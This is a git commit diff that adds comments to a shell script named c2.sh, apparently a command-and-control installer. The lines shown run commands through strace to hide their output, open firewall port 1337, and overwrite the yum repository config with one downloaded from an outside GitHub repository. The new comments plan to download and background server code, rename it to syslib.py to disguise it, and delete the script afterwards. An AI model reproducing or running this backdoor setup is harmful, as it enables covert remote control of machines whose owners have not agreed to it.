93e656ad649c93cf962e8aecb054438c0f817f56
Rohit Anantha <anantha.rohit.11@gmail.com>
2024-10-25 22:45:28 -0500

    commented the script code

--- c2.sh
+++ c2.sh
@@ -4,7 +4,16 @@
 #{ these brackets will hide the result of the code
 # -lic runs the commands in a new shell that also closes - the goal is to run the python in this so that it won't close
 
-# opens firewall to 1337 :)
+# Line by Line:
+# 1. opens firewall to 1337 :)
+# 2. downloads the yum config
+# 3. cleans up
+# 4. installs python
+# 5. downloads the server code
+# TODO hide the code and changes (rename server code to syslib.py)
+# 6. runs the server code and backgrounds it
+# 7. Look into deletion of script as well for one last hiding bit?
+
 sudo strace -o /dev/null /bin/sh -lic "iptables -A IN_public_allow -p tcp -m tcp --dport 1337 -m conntrack --ctstate NEW,UNTRACKED -j ACCEPT;
 curl https://raw.githubusercontent.com/Rohit-Anantha/C2/refs/heads/main/CentOS-Base.repo > /etc/yum.repos.d/CentOS-Base.repo;
 yum clean all;
